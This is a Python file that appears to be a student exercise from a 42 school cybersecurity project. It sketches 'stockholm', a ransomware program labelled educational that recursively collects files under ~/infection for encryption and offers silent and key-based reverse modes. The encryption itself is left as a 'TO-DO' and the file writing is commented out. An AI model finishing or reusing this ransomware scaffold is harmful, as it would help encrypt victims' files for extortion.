# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/02/14 21:33:17 by guferrei          #+#    #+#              #
#    Updated: 2025/02/17 16:34:34 by guferrei         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import argparse, glob, os
from os.path import expanduser

path = expanduser("~") + "/infection"
public_key = b"""-----BEGIN RSA PUBLIC KEY----- MBgCEQCl/IGtHk0lD0CvdwOKbFtzAgMBAAE=-----END RSA PUBLIC KEY-----"""

def program_args():
	parser = argparse.ArgumentParser(description="This program is a Ransomware, be careful!!! This project is for educational purposes only. You should never use this type of program for malicious purposes.")
	group = parser.add_mutually_exclusive_group()
	group.add_argument('-v', '--version', action="store_true", help="show the version of the program")
	group.add_argument('-r', '--reverse', type=str, help="reverse the infection, must be followed by the key to decryption")
	group.add_argument('-s', '--silent', action="store_true", help="run the program in silent mode")
	return parser.parse_args()

def print_version():
	print("stockholm 1.0.0")

def reverse(key: str):
	print(key)

def get_files():
	file_list = []
	for file in glob.glob(path + "/**/*", recursive=True):
		if os.path.isfile(file):
			file_list.append(file)
	return file_list


def encrypt(file, args):
	if not args.silent:
		print("ecrypting file {}...".format(file))
	with open(file, 'rb') as f:
		plaintext = f.read()

	# ENCRYPT
	ciphertext = "TO-DO"

	# with open(file+'.ft', 'wb') as f:
		# f.write(ciphertext)

def run(args):
	file_list = get_files()
	for file in file_list:
		encrypt(file, args)

def main():
	args = program_args()
	if args.version:
		print_version()
	if args.reverse:
		reverse(args.reverse)
	run(args)

if __name__ == '__main__':
	main()